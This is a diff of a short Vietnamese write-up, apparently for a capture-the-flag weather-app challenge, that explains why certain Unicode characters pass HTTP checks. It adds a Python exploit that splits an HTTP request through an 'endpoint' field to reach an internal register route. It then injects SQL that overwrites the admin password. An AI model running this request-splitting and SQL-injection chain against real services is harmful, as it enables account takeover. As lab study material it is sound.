@@ -42,7 +42,25 @@ Có mấy cái như space = "\u0120" \r = "\u010D" \n = "\u010A" là biểu th�
 Trong HTTP, một số ký tự được coi là ký tự điều khiển (control characters) và không được phép xuất hiện trong các thành phần như tiêu đề (headers), đường dẫn (URL), hoặc nội dung yêu cầu/phản hồi. 
 Tuy nhiên, các ký tự Unicode được đề cập không phải là ký tự điều khiển trong HTTP, nên có thể sử dụng mà không vi phạm quy tắc của giao thức
 
+```
+import requests
 
+username = "admin"
+password = "admin') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"
+
+parsedUser = username.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22")
+parsedPass = password.replace(" ", "\u0120").replace("'", "%27").replace('"',"%22")
+
+contentLength = len(parsedUser) + len(parsedPass) + 20
+
+
+test = "localhost/lmao\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010A"
+test = test + "Content-Length:\u0120" + str(contentLength) + "\u010D\u010A\u010D\u010A"
+test = test + f"username={parsedUser}&password={parsedPass}" + "\u010D\u010A\u010D\u010AGET\u0120/"
+ 
+requests.post("http://94.237.54.116:32634/api/weather", json={'endpoint': test, 'city': 'Hanoi','country': 'VN'})
+
+```
 
 
 
